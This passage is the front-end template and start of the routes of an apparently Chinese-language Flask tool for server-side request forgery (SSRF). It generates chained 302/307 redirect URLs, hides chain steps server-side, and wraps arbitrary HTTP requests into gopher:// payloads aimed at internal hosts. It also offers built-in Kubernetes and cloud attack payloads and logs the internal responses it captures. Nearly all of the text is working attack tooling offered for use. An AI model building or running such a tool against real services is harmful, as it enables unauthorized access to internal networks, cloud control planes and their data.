                    <div style="margin-bottom: 15px; display: flex; gap: 10px;">
                        <button class="btn btn-secondary" onclick="addStatelessStep(false)">+ 添加中转节点</button>
                        <button class="btn btn-secondary" onclick="addStatelessStep(true)" style="background: linear-gradient(135deg, #0ba360 0%, #3cba92 100%);">+ 添加终点节点</button>
                        <button class="btn btn-warning" onclick="quickSetup()">⚡ 快捷生成 (1中转+1终点)</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statelessStepsContainer').innerHTML=''; stepCount=0;">清空</button>
                    </div>

                    <div id="statelessStepsContainer"></div>
                    
                    <button class="btn" onclick="generateStatelessChain()" style="margin-top: 10px;">🚀 生成链式探针 Payload URL</button>
                </div>

                <!-- 有状态路径隐藏链 Tab -->
                <div id="tab-stateful" class="tab-content">
                    <div class="protocol-tip">
                        🔒 <b>有状态路径隐藏链：</b> 所有跳转步骤存储在服务端，URL 中不再出现任何编码参数。<br>
                        1. 为每一跳自定义短路径（如 <code>/a</code>, <code>/b</code>）。<br>
                        2. 中间步骤自动重定向到下一跳路径（同服务），最后一步到达外部最终目标。<br>
                        3. 通过 307 可保留原始请求方法，适合 POST/PUT 敏感探测。
                    </div>

                    <div style="margin-bottom: 15px; display: flex; gap: 10px;">
                        <button class="btn btn-secondary" onclick="addStatefulStep(false)">+ 添加中转节点</button>
                        <button class="btn btn-secondary" onclick="addStatefulStep(true)" style="background: linear-gradient(135deg, #0ba360 0%, #3cba92 100%);">+ 添加终点节点 (需设最终目标)</button>
                        <button class="btn btn-danger" onclick="document.getElementById('statefulStepsContainer').innerHTML=''; statefulStepCount=0;">清空</button>
                    </div>

                    <div id="statefulStepsContainer"></div>

                    <div class="form-group" style="margin-top:20px;" id="finalTargetGroup" hidden>
                        <label>📦 快捷选择内置 POC</label>
                        <select id="statefulPocSelect"><option value="">-- 手动输入 --</option></select>
                        <label style="margin-top: 10px;">🎯 最终目标 URL (最后一步跳转外部地址)</label>
                        <input type="text" id="statefulFinalTarget" placeholder="http://target.internal/service">
                        <button class="btn btn-warning btn-small toggle-editor-btn" onclick="toggleStatefulEditor()" style="margin-top:8px;">✏️ 高级请求编辑 (自定义Headers和Body)</button>
                        <div class="req-editor" id="statefulReqEditor" style="display:none;">
                            <label>请求方法</label>
                            <select class="req-method">
                                <option value="GET">GET</option>
                                <option value="POST" selected>POST</option>
                                <option value="PUT">PUT</option>
                                <option value="DELETE">DELETE</option>
                                <option value="OPTIONS">OPTIONS</option>
                                <option value="HEAD">HEAD</option>
                                <option value="PATCH">PATCH</option>
                            </select>
                            <label>Host</label>
                            <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                            <label>路径</label>
                            <input type="text" class="req-path" placeholder="/api/v1/...">
                            <label>请求头 (点击下方添加)</label>
                            <div class="req-headers" id="statefulReqHeaders"></div>
                            <button class="btn btn-secondary btn-small" onclick="addHeaderRow('statefulReqHeaders')" style="margin-bottom:8px;">+ 添加请求头</button>
                            <label>请求体</label>
                            <textarea class="req-body" placeholder="支持JSON或其他任意格式内容"></textarea>
                            <button class="btn btn-small" style="margin-top:5px;" onclick="applyStatefulCustomRequest()">✅ 应用并生成 Gopher Payload</button>
                        </div>
                    </div>

                    <button class="btn" onclick="generateStatefulChain()" style="margin-top: 10px;">🔗 生成隐藏链首跳 URL</button>
                </div>

                <div class="result-box" id="resultBox">
                    <h3 style="color:#00ff88;margin-bottom:10px;font-size:14px;">🎯 您的专属探针 Payload:</h3>
                    <div class="payload-url" id="payloadUrl"></div>
                    <button class="copy-btn" onclick="copyPayload()">📋 一键复制 URL</button>
                </div>
            </div>

            <!-- 右侧：日志面板 -->
            <div class="card">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
                    <h2 style="margin:0;">📡 内网回显与请求日志</h2>
                    <div style="display: flex; gap: 8px;">
                        <button class="btn btn-danger" style="padding: 8px 18px; font-size: 13px;" onclick="clearAllLogs()">🗑 清空日志</button>
                        <button class="manual-refresh-btn" id="manualRefreshBtn">🔄 手动刷新</button>
                    </div>
                </div>
                <div class="logs-container" id="logsContainer">
                    <div style="text-align:center; padding:40px; color:#666;">等待 SSRF 流量访问...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const POCS = {{ poc_json|safe }};
        const BASE_URL = window.location.origin;
        let stepCount = 0;
        let statefulStepCount = 0;

        function escapeHtml(text) {
            if (!text) return '';
            return text.replace(/[&<>"']/g, function(m) {
                const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' };
                return map[m];
            });
        }

        function getStatusCodeOptions(selectedCode = '302') {
            const codes = [
                {code: '300', desc: 'Multiple Choices'},
                {code: '301', desc: 'Moved Permanently (可能改GET)'},
                {code: '302', desc: 'Found (临时，改GET)'},
                {code: '303', desc: 'See Other (强制GET)'},
                {code: '304', desc: 'Not Modified'},
                {code: '305', desc: 'Use Proxy'},
                {code: '306', desc: '(Unused)'},
                {code: '307', desc: 'Temporary Redirect (保留方法)'},
                {code: '308', desc: 'Permanent Redirect (保留方法)'}
            ];
            return codes.map(c => `<option value="${c.code}" ${c.code === selectedCode ? 'selected' : ''}>${c.code} - ${c.desc}</option>`).join('');
        }

        document.getElementById('statusCode').innerHTML = getStatusCodeOptions('302');

        let pocOptionsHtml = '<option value="" data-method="AUTO">-- 手动输入 或 选择内置云原生攻击载荷 --</option>';
        const categories = {};
        POCS.forEach((poc) => {
            if (!categories[poc.category]) categories[poc.category] = [];
            categories[poc.category].push(poc);
        });
        for (const [cat, pocs] of Object.entries(categories)) {
            pocOptionsHtml += `<optgroup label="${cat}">`;
            pocs.forEach(p => { 
                pocOptionsHtml += `<option value="${p.payload}" data-method="${p.method || 'GET'}">[${p.method}] ${p.name}</option>`; 
            });
            pocOptionsHtml += `</optgroup>`;
        }

        // 基础POC选择事件 - 带请求体预加载
        document.getElementById('pocSelect').innerHTML = pocOptionsHtml;
        document.getElementById('pocSelect').addEventListener('change', function() { 
            const opt = this.options[this.selectedIndex];
            const target = opt.value;
            if (!target) return;
            document.getElementById('targetUrl').value = target;
            const method = opt.getAttribute('data-method');
            const matchedPoc = POCS.find(p => p.payload === target);
            if (matchedPoc) {
                handlePocSelectionForEditor(matchedPoc, 'basicReqEditor');
            }
            if (method && method !== 'GET' && target.startsWith('http://')) {
                document.getElementById('basicReqEditor').style.display = 'block';
            } else if (method && method !== 'GET' && target.startsWith('https://')) {
                document.getElementById('statusCode').value = '307';
                alert(`🛡️ 自动化提示：已选择 [${method}] 型 K8s POC！目标属于 HTTPS 协议。已为您自动切换至【307】状态码！\n👉 请在发包时原生使用 ${method} 触发此地址。`);
            }
        });

        // 有状态POC选择
        document.getElementById('statefulPocSelect').innerHTML = pocOptionsHtml.replace('-- 手动输入 或 选择内置云原生攻击载荷 --', '-- 手动输入 --');
        document.getElementById('statefulPocSelect').addEventListener('change', function() {
            const opt = this.options[this.selectedIndex];
            if (!opt.value) return;
            document.getElementById('statefulFinalTarget').value = opt.value;
            const method = opt.getAttribute('data-method');
            const matchedPoc = POCS.find(p => p.payload === opt.value);
            if (matchedPoc) {
                handlePocSelectionForEditor(matchedPoc, 'statefulReqEditor');
            }
            if (method && method !== 'GET' && opt.value.startsWith('https://')) {
                alert(`💡 提示：该 POC 需要 ${method} 方法且目标为 HTTPS。请确保 SSRF 攻击时使用原生 ${method} 请求触发此链，并建议在最终一步的节点设置 307 状态码以保留方法。`);
            }
        });

        // 通用POC预加载函数
        function handlePocSelectionForEditor(poc, editorId) {
            const editor = document.getElementById(editorId);
            if (!editor) return;
            editor.style.display = 'block';
            const method = poc.method || 'GET';
            editor.querySelector('.req-method').value = method;
            let host = '', path = '/';
            try {
                const url = new URL(poc.payload);
                host = url.host;
                path = url.pathname + url.search;
            } catch(e) {}
            editor.querySelector('.req-host').value = host;
            editor.querySelector('.req-path').value = path;
            // 清空并填充自定义请求头
            const headersContainer = editor.querySelector('.req-headers');
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (poc.headers && typeof poc.headers === 'object') {
                    for (const [key, value] of Object.entries(poc.headers)) {
                        addHeaderRowWithValues(headersContainer, key, value);
                    }
                }
                if (method === 'POST' || method === 'PUT' || method === 'PATCH') {
                    addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
                }
            }
            // 请求体填充
            const bodyInput = editor.querySelector('.req-body');
            if (bodyInput) {
                bodyInput.value = poc.body || '';
                if (!poc.body && (method === 'POST' || method === 'PUT')) {
                    bodyInput.value = '{"ssrf_probe": "success"}';
                }
            }
        }

        document.querySelectorAll('.nav-tab').forEach(tab => {
            tab.addEventListener('click', function() {
                document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
                this.classList.add('active');
                document.getElementById('tab-' + this.dataset.tab).classList.add('active');
            });
        });

        function showResult(url) {
            document.getElementById('payloadUrl').textContent = url;
            document.getElementById('resultBox').classList.add('show');
        }

        function copyPayload() {
            const text = document.getElementById('payloadUrl').textContent;
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text)
                    .then(() => alert('✅ 已成功复制到剪贴板!'))
                    .catch(() => alert('❌ 复制失败，请手动复制'));
            } else {
                const textArea = document.createElement("textarea");
                textArea.value = text;
                textArea.style.position = "fixed";
                textArea.style.top = "0";
                textArea.style.left = "0";
                textArea.style.width = "2em";
                textArea.style.height = "2em";
                textArea.style.padding = "0";
                textArea.style.border = "none";
                textArea.style.outline = "none";
                textArea.style.boxShadow = "none";
                textArea.style.background = "transparent";
                textArea.style.opacity = "0";
                document.body.appendChild(textArea);
                textArea.focus();
                textArea.select();
                try {
                    const successful = document.execCommand('copy');
                    if (successful) {
                        alert('✅ 已成功复制到剪贴板! (兼容模式)');
                    } else {
                        alert('❌ 您的浏览器不支持自动复制，请手动选中并复制URL');
                    }
                } catch (err) {
                    alert('❌ 复制失败，请手动选中并复制URL');
                }
                document.body.removeChild(textArea);
            }
        }

        function generateBasicPayload() {
            const code = document.getElementById('statusCode').value;
            const target = document.getElementById('targetUrl').value.trim();
            if (!target) return alert('请输入目标URL');
            showResult(`${BASE_URL}/r?code=${code}&url=${encodeURIComponent(target)}`);
        }

        function safeBase64UrlEncode(obj) {
            const jsonStr = JSON.stringify(obj);
            const utf8Bytes = encodeURIComponent(jsonStr).replace(/%([0-9A-F]{2})/g, 
                function(match, p1) { return String.fromCharCode('0x' + p1); });
            const base64 = btoa(utf8Bytes);
            return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
        }

        // ========== 高级请求编辑器公共函数 ==========
        function addHeaderRow(containerIdOrElement) {
            let container;
            if (typeof containerIdOrElement === 'string') {
                container = document.getElementById(containerIdOrElement);
            } else if (containerIdOrElement && containerIdOrElement.classList && containerIdOrElement.classList.contains('req-headers')) {
                container = containerIdOrElement;
            } else if (containerIdOrElement && containerIdOrElement.target) {
                const btn = containerIdOrElement.target;
                const step = btn.closest('.step-item');
                container = step ? step.querySelector('.req-headers') : null;
            }
            if (!container) return;
            const row = document.createElement('div');
            row.className = 'header-row';
            row.innerHTML = `
                <input type="text" class="header-key" placeholder="Header Name">
                <input type="text" class="header-value" placeholder="Header Value">
                <button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function addHeaderRowWithValues(container, key, value) {
            const row = document.createElement('div');
            row.className = 'header-row';
            row.innerHTML = `
                <input type="text" class="header-key" value="${escapeHtml(key)}">
                <input type="text" class="header-value" value="${escapeHtml(value)}">
                <button class="btn btn-danger btn-small" onclick="this.parentElement.remove()">✕</button>`;
            container.appendChild(row);
        }

        function buildGopherFromEditor(editor) {
            const method = editor.querySelector('.req-method').value;
            const host = editor.querySelector('.req-host').value.trim();
            const path = editor.querySelector('.req-path').value.trim();
            const body = editor.querySelector('.req-body').value;
            if (!host) {
                alert('❌ 请填写 Host');
                return null;
            }
            let req = `${method} ${path} HTTP/1.1\r\n`;
            let hasContentType = false;
            editor.querySelectorAll('.header-row').forEach(row => {
                const key = row.querySelector('.header-key').value.trim();
                const value = row.querySelector('.header-value').value.trim();
                if (key) {
                    req += `${key}: ${value}\r\n`;
                    if (key.toLowerCase() === 'content-type') hasContentType = true;
                }
            });
            if (!hasContentType && body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
                req += `Content-Type: application/json\r\n`;
            }
            if (body) {
                req += `Content-Length: ${new Blob([body]).size}\r\n\r\n`;
                req += body;
            } else {
                req += `\r\n`;
            }
            let gopherPayload = encodeURIComponent(req).replace(/%20/g, ' ');
            let port = '80';
            let hostname = host;
            if (host.includes(':')) {
                const parts = host.split(':');
                hostname = parts[0];
                port = parts[1];
            }
            return `gopher://${hostname}:${port}/_${gopherPayload}`;
        }

        function applyBasicCustomRequest() {
            const editor = document.getElementById('basicReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) {
                document.getElementById('targetUrl').value = gopherUrl;
                editor.style.display = 'none';
                alert('✅ Gopher Payload 已生成并填入目标URL');
            }
        }

        function applyStatefulCustomRequest() {
            const editor = document.getElementById('statefulReqEditor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) {
                document.getElementById('statefulFinalTarget').value = gopherUrl;
                editor.style.display = 'none';
                alert('✅ Gopher Payload 已生成并填入最终目标URL');
            }
        }

        function toggleBasicEditor() {
            const editor = document.getElementById('basicReqEditor');
            editor.style.display = editor.style.display === 'none' ? 'block' : 'none';
        }

        function toggleStatefulEditor() {
            const editor = document.getElementById('statefulReqEditor');
            editor.style.display = editor.style.display === 'none' ? 'block' : 'none';
        }

        // 智能链中的自动填充 (增强版，支持POC预加载)
        function autoFillEditor(step, pocData = null) {
            const urlInput = step.querySelector('.s-url');
            const methodSelect = step.querySelector('.s-method');
            const hostInput = step.querySelector('.req-host');
            const pathInput = step.querySelector('.req-path');
            const headersContainer = step.querySelector('.req-headers');
            const bodyInput = step.querySelector('.req-body');
            const methodVal = methodSelect.value === 'AUTO' ? (pocData?.method || 'GET') : methodSelect.value;
            let host = '', path = '/';
            try {
                const urlStr = urlInput.value.trim();
                if (urlStr.startsWith('http://') || urlStr.startsWith('https://')) {
                    const url = new URL(urlStr);
                    host = url.host;
                    path = url.pathname + url.search;
                }
            } catch(e) {}
            if (hostInput) hostInput.value = host;
            if (pathInput) pathInput.value = path;
            if (headersContainer) {
                headersContainer.innerHTML = '';
                addHeaderRowWithValues(headersContainer, 'Host', host);
                if (pocData && pocData.headers) {
                    for (const [key, value] of Object.entries(pocData.headers)) {
                        addHeaderRowWithValues(headersContainer, key, value);
                    }
                }
                if (methodVal === 'POST' || methodVal === 'PUT' || methodVal === 'PATCH') {
                    addHeaderRowWithValues(headersContainer, 'Content-Type', 'application/json');
                }
            }
            if (bodyInput) {
                bodyInput.value = pocData?.body || '';
                if (!bodyInput.value && (methodVal === 'POST' || methodVal === 'PUT')) {
                    bodyInput.value = '{"ssrf_probe": "success"}';
                }
            }
        }

        function applyMethodWrap(select) {
            const method = select.value;
            if (method === 'AUTO') return; 
            const step = select.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            let urlStr = urlInput.value.trim();
            if (!urlStr) {
                alert('⚠️ 请先在右侧输入或选择 HTTP 目标，再尝试进行强制装填！');
                select.value = 'AUTO'; return;
            }
            if (urlStr.startsWith('http://')) {
                const editor = step.querySelector('.req-editor');
                editor.style.display = 'block';
                autoFillEditor(step);  // 不传pocData，保留原有行为
                select.value = method;
            } else if (urlStr.startsWith('https://')) {
                alert('⚠️ Gopher 协议无法直接发包给 HTTPS 服务进行 TLS 握手！K8s等环境请直接使用 307 状态码做无损重定向。');
                select.value = 'AUTO';
            } else if (urlStr.startsWith('gopher://')) {
                select.value = 'AUTO';
            } else {
                alert('⚠️ 仅支持将 http:// 协议自动打包为 Gopher 报文！');
                select.value = 'AUTO';
            }
        }

        function handlePocSelect(selectElement) {
            const option = selectElement.options[selectElement.selectedIndex];
            const method = option.getAttribute('data-method') || 'AUTO';
            const urlInput = selectElement.nextElementSibling;
            const methodSelect = selectElement.previousElementSibling;
            const step = selectElement.closest('.step-item');
            const codeSelect = step.querySelector('.s-code');
            
            urlInput.value = option.value;
            
            // 尝试获取完整POC数据用于预填充
            const pocData = POCS.find(p => p.payload === option.value);
            if (pocData) {
                const editor = step.querySelector('.req-editor');
                const sMethod = step.querySelector('.s-method');
                if (pocData.method && pocData.method !== 'GET') {
                    if (option.value.startsWith('http://')) {
                        editor.style.display = 'block';
                        autoFillEditor(step, pocData);
                        sMethod.value = pocData.method;
                    } else if (option.value.startsWith('https://')) {
                        codeSelect.value = '307';
                        alert(`🛡️ K8s / HTTPS 实战提示：当前目标是 HTTPS 且需要 【${pocData.method}】请求！请务必以原生 ${pocData.method} 触发此重定向器。`);
                    }
                }
            }
        }

        function toggleRequestEditor(btn) {
            const step = btn.closest('.step-item');
            const editor = step.querySelector('.req-editor');
            if (editor.style.display === 'none') {
                editor.style.display = 'block';
                autoFillEditor(step);
            } else {
                editor.style.display = 'none';
            }
        }

        function applyCustomRequest(btn) {
            const step = btn.closest('.step-item');
            const urlInput = step.querySelector('.s-url');
            const methodSelect = step.querySelector('.s-method');
            const editor = step.querySelector('.req-editor');
            const gopherUrl = buildGopherFromEditor(editor);
            if (gopherUrl) {
                urlInput.value = gopherUrl;
                methodSelect.value = 'AUTO';
                editor.style.display = 'none';
                alert('✅ Gopher Payload 已生成并填入目标URL');
            }
        }

        function addStatelessStep(isFinal = false) {
            stepCount++;
            const bgColor = isFinal ? 'rgba(0, 255, 136, 0.08)' : 'rgba(0, 0, 0, 0.3)';
            const borderLeft = isFinal ? '4px solid #00ff88' : '4px solid #74b9ff';
            const title = isFinal ? `🎯 节点 ${stepCount} (最终执行载荷)` : `🔀 节点 ${stepCount} (中转跳板)`;
            const defaultCode = isFinal ? '307' : '302';

            const html = `
                <div class="step-item stateless-step" style="background: ${bgColor}; border-left: ${borderLeft};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${isFinal?'#00ff88':'#74b9ff'};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove()">✖ 删除</button>
                    </div>
                    <div class="step-form">
                        <label>跳转配置</label>
                        <select class="s-code" style="width: 100%;">
                            ${getStatusCodeOptions(defaultCode)}
                        </select>
                        
                        <label style="margin-top: 10px; grid-column: 1 / -1; display:flex; justify-content:space-between;">
                            <span>目标协议、POC与 URL</span>
                            <span style="color:#888; font-size:11px;">※ HTTP API 若需强转将打开高级编辑</span>
                        </label>
                        <div class="step-input-group" style="grid-column: 1 / -1;">
                            <select class="s-method" onchange="applyMethodWrap(this)" style="width: 16%; background: rgba(0,255,136,0.1); color: #00ff88; border: 1px solid #00ff88; font-weight:bold; cursor:pointer;">
                                <option value="AUTO">🔄 原样</option>
                                <option value="GET">转 GET(Gopher)</option>
                                <option value="POST">转 POST(Gopher)</option>
                                <option value="PUT">转 PUT(Gopher)</option>
                                <option value="OPTIONS">转 OPTIONS</option>
                                <option value="TRACE">转 TRACE</option>
                                <option value="DELETE">转 DELETE</option>
                            </select>
                            <select class="s-poc" onchange="handlePocSelect(this)" style="width: 29%; background: rgba(255,255,255,0.05);">
                                ${pocOptionsHtml}
                            </select>
                            <input type="text" class="s-url" placeholder="如需本节点重定向套娃可留空，或输入 Gopher/Dict 等协议" style="width: 55%; font-family: monospace;">
                        </div>
                        <button class="btn btn-warning btn-small toggle-editor-btn" onclick="toggleRequestEditor(this)" style="grid-column: 1 / -1;">✏️ 高级请求编辑 (自定义Headers和Body)</button>
                        <div class="req-editor" style="display:none; grid-column: 1 / -1;">
                            <label>请求方法</label>
                            <select class="req-method">
                                <option value="GET">GET</option>
                                <option value="POST" selected>POST</option>
                                <option value="PUT">PUT</option>
                                <option value="DELETE">DELETE</option>
                                <option value="OPTIONS">OPTIONS</option>
                                <option value="HEAD">HEAD</option>
                                <option value="PATCH">PATCH</option>
                            </select>
                            <label>Host</label>
                            <input type="text" class="req-host" placeholder="127.0.0.1:8080">
                            <label>路径</label>
                            <input type="text" class="req-path" placeholder="/api/v1/create">
                            <label>请求头 (点击下方添加)</label>
                            <div class="req-headers"></div>
                            <button class="btn btn-secondary btn-small" onclick="addHeaderRow(this)" style="margin-bottom:8px;">+ 添加请求头</button>
                            <label>请求体</label>
                            <textarea class="req-body" placeholder="支持JSON或其他任意格式内容"></textarea>
                            <button class="btn btn-small" style="margin-top:5px;" onclick="applyCustomRequest(this)">✅ 应用并生成 Gopher Payload</button>
                        </div>
                    </div>
                </div>`;
            document.getElementById('statelessStepsContainer').insertAdjacentHTML('beforeend', html);
        }
        
        function quickSetup() {
            document.getElementById('statelessStepsContainer').innerHTML = '';
            stepCount = 0;
            addStatelessStep(false);
            addStatelessStep(true);
            document.querySelector('.stateless-step .s-url').value = BASE_URL;
        }
        quickSetup();

        function generateStatelessChain() {
            const steps = document.querySelectorAll('.stateless-step');
            if (steps.length === 0) return alert('❌ 请至少添加一个节点');
            let chainData = { s: [] };
            let err = false;
            steps.forEach((step, index) => {
                const c = parseInt(step.querySelector('.s-code').value);
                const urlInput = step.querySelector('.s-url');
                let t = urlInput.value.trim();
                if(!t && index < steps.length - 1) t = BASE_URL;
                if(!t){ 
                    err = true; 
                    urlInput.style.borderColor = '#ff6b6b'; 
                } else { 
                    urlInput.style.borderColor = '#444'; 
                    chainData.s.push({c, t}); 
                }
            });
            if(err) return alert('❌ 请完善标红的目标URL！');
            const payloadUrl = `${BASE_URL}/c?b=${safeBase64UrlEncode(chainData)}`;
            showResult(payloadUrl);
        }

        function addStatefulStep(isFinal = false) {
            statefulStepCount++;
            const bgColor = isFinal ? 'rgba(0, 255, 136, 0.08)' : 'rgba(0, 0, 0, 0.3)';
            const borderLeft = isFinal ? '4px solid #00ff88' : '4px solid #74b9ff';
            const title = isFinal ? `🎯 终点节点 ${statefulStepCount} (需最终目标)` : `🔀 中转节点 ${statefulStepCount}`;
            const defaultCode = isFinal ? '307' : '302';
            const html = `
                <div class="step-item stateful-step" data-isfinal="${isFinal}" style="background: ${bgColor}; border-left: ${borderLeft};">
                    <div class="step-header">
                        <span class="step-title" style="color: ${isFinal?'#00ff88':'#74b9ff'};">${title}</span>
                        <button class="btn btn-danger" onclick="this.closest('.step-item').remove(); syncFinalTargetVisibility();">✖ 删除</button>
                    </div>
                    <div class="step-form">
                        <label>跳转路径 (例如 /a)</label>
                        <input type="text" class="s-path" placeholder="/a" style="grid-column:1/-1;">
                        <label>响应码</label>
                        <select class="s-code" style="grid-column:1/-1;">
                            ${getStatusCodeOptions(defaultCode)}
                        </select>
                    </div>
                    <div style="color:#888; font-size:12px; margin-top:5px;">${isFinal ? '此节点需配合下方的【最终目标 URL】' : '此节点将自动重定向到下一个节点路径'}</div>
                </div>`;
            document.getElementById('statefulStepsContainer').insertAdjacentHTML('beforeend', html);
            syncFinalTargetVisibility();
        }

        function syncFinalTargetVisibility() {
            const finalSteps = document.querySelectorAll('.stateful-step[data-isfinal="true"]');
            const finalGroup = document.getElementById('finalTargetGroup');
            if (finalSteps.length > 0) {
                finalGroup.hidden = false;
            } else {
                finalGroup.hidden = true;
            }
        }

        async function generateStatefulChain() {
            const steps = document.querySelectorAll('.stateful-step');
            if (steps.length === 0) return alert('❌ 请至少添加一个节点');
            const finalTarget = document.getElementById('statefulFinalTarget').value.trim();
            const hasFinal = [...steps].some(s => s.dataset.isfinal === 'true');
            if (hasFinal && !finalTarget) {
                return alert('❌ 检测到终点节点，必须填写最终目标 URL');
            }
            const payload = {
                steps: [],
                final_target: hasFinal ? finalTarget : null,
                base_url: BASE_URL
            };
            let err = false;
            steps.forEach((step, idx) => {
                const path = step.querySelector('.s-path').value.trim();
                const code = parseInt(step.querySelector('.s-code').value);
                if (!path || !path.startsWith('/')) {
                    step.querySelector('.s-path').style.borderColor = '#ff6b6b';
                    err = true;
                } else {
                    step.querySelector('.s-path').style.borderColor = '#444';
                    payload.steps.push({ path, code });
                }
            });
            if (err) return alert('❌ 请完善标红的路径（必须以 / 开头）');
            if (hasFinal) {
                payload.final_target = finalTarget;
            }
            try {
                const res = await fetch('/api/create_stateful_chain', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                if (data.error) {
                    alert('❌ 创建失败: ' + data.error);
                } else {
                    showResult(data.first_url);
                }
            } catch(e) {
                alert('❌ 网络错误');
            }
        }

        // ========== 日志操作函数 ==========
        async function refreshLogs() {
            const expandedIds = new Set();
            document.querySelectorAll('.log-entry .log-ext[style*="display: block"]').forEach(ext => {
                const entry = ext.closest('.log-entry');
                if (entry && entry.dataset.logid) expandedIds.add(entry.dataset.logid);
            });

            try {
                const res = await fetch('/api/logs'); const data = await res.json();
                document.getElementById('totalLogs').textContent = data.total;
                document.getElementById('uniqueIPs').textContent = new Set(data.logs.map(l=>l.ip)).size;
                
                const box = document.getElementById('logsContainer');
                if(data.logs.length === 0) {
                    box.innerHTML = '<div style="text-align:center;padding:40px;color:#666;">等待 SSRF 流量访问...</div>';
                    return;
                }
                
                box.innerHTML = data.logs.map(l => {
                    const mClass = `method-${l.method}` || 'method-GET';
                    const respHeaders = l.response_headers || {};
                    const respBody = l.response_body || '';
                    const reqHeaders = l.headers || {};
                    const isExpanded = expandedIds.has(l.id);

                    const params = new URLSearchParams(l.args).toString();
                    const queryString = params ? '?' + params : '';
                    let rawRequest = `${l.method} ${l.path}${queryString} HTTP/1.1\r\n`;
                    for (const [key, value] of Object.entries(reqHeaders)) {
                        rawRequest += `${key}: ${value}\r\n`;
                    }
                    rawRequest += `\r\n`;
                    if (l.request_body) {
                        rawRequest += l.request_body;
                    }

                    let rawResponse = `HTTP/1.1 ${l.status_code || '000'} OK\r\n`;
                    for (const [key, value] of Object.entries(respHeaders)) {
                        rawResponse += `${key}: ${value}\r\n`;
                    }
                    rawResponse += `\r\n`;
                    if (respBody) {
                        rawResponse += respBody;
                    }

                    return `
                    <div class="log-entry" data-logid="${l.id}" onclick="
                        const ext = this.querySelector('.log-ext');
                        ext.style.display = ext.style.display === 'none' ? 'block' : 'none';
                    ">
                        <button class="delete-log-btn" onclick="event.stopPropagation(); deleteLog('${l.id}')" title="删除此条日志">✕</button>
                        <div class="log-header">
                            <span class="log-ip">${l.ip}</span>
                            <span><span class="method-badge ${mClass}">${l.method}</span><span class="log-time">${l.timestamp}</span></span>
                        </div>
                        <div class="log-detail">
                            <span class="log-label">请求路径:</span><span class="log-value url">${l.path}${queryString}</span>
                            ${l.redirect_url ? `<span class="log-label">30x跳向:</span><span class="log-value url">→ ${l.redirect_url}</span>` : ''}
                        </div>
                        <div class="log-ext" style="display:${isExpanded ? 'block' : 'none'}; margin-top:10px; padding-top:10px; border-top:1px dashed #444;" onclick="event.stopPropagation()">
                            <div style="margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                                <strong style="color:#00ff88;">📥 原始请求</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation(); copyRawContent(this)">📋 复制</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawRequest)}</pre>
                            <div style="margin:10px 0; display:flex; justify-content:space-between; align-items:center;">
                                <strong style="color:#74b9ff;">📤 原始响应</strong>
                                <button class="copy-raw-btn" onclick="event.stopPropagation(); copyRawContent(this)">📋 复制</button>
                            </div>
                            <pre class="log-pre">${escapeHtml(rawResponse)}</pre>
                        </div>
                    </div>`;
                }).join('');
            } catch(e) {}
        }

        function copyRawContent(btn) {
            const pre = btn.parentElement.nextElementSibling;
            if (!pre) return;
            const text = pre.textContent;
            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(() => {
                    btn.textContent = '✅ 已复制';
                    btn.classList.add('copied');
                    setTimeout(() => { btn.textContent = '📋 复制'; btn.classList.remove('copied'); }, 1000);
                }).catch(() => fallbackCopy(text, btn));
            } else {
                fallbackCopy(text, btn);
            }
        }

        function fallbackCopy(text, btn) {
            const textArea = document.createElement("textarea");
            textArea.value = text;
            textArea.style.position = "fixed";
            textArea.style.top = "0";
            textArea.style.left = "0";
            textArea.style.opacity = "0";
            document.body.appendChild(textArea);
            textArea.focus();
            textArea.select();
            try {
                const successful = document.execCommand('copy');
                if (successful) {
                    btn.textContent = '✅ 已复制';
                    btn.classList.add('copied');
                    setTimeout(() => { btn.textContent = '📋 复制'; btn.classList.remove('copied'); }, 1000);
                } else {
                    alert('复制失败，请手动选择并复制');
                }
            } catch (err) {
                alert('复制失败，请手动选择并复制');
            }
            document.body.removeChild(textArea);
        }

        async function clearAllLogs() {
            if (!confirm('确定要清空所有日志记录吗？')) return;
            try {
                const res = await fetch('/api/logs', { method: 'DELETE' });
                if (res.ok) {
                    refreshLogs();
                } else {
                    const data = await res.json();
                    alert('清空失败: ' + (data.error || '未知错误'));
                }
            } catch(e) {
                alert('网络错误，清空失败');
            }
        }

        async function deleteLog(logId) {
            if (!logId) return;
            try {
                const res = await fetch(`/api/logs/${logId}`, { method: 'DELETE' });
                if (res.ok) {
                    refreshLogs();
                } else {
                    const data = await res.json();
                    alert('删除失败: ' + (data.error || '未知错误'));
                }
            } catch(e) {
                alert('网络错误，删除失败');
            }
        }

        document.getElementById('manualRefreshBtn').addEventListener('click', refreshLogs);
        refreshLogs();
    </script>
</body>
</html>
"""

# ==================== 路由逻辑 ====================
@app.route('/')
def index():
    if not check_access_token(): return 'Unauthorized', 401
    poc_json = json.dumps(POC_LIST, ensure_ascii=False)
    return render_template_string(INDEX_HTML, poc_json=poc_json, poc_count=len(POC_LIST))

@app.route('/r', methods=SUPPORTED_METHODS)
def basic_redirect():
    log_entry = log_request()
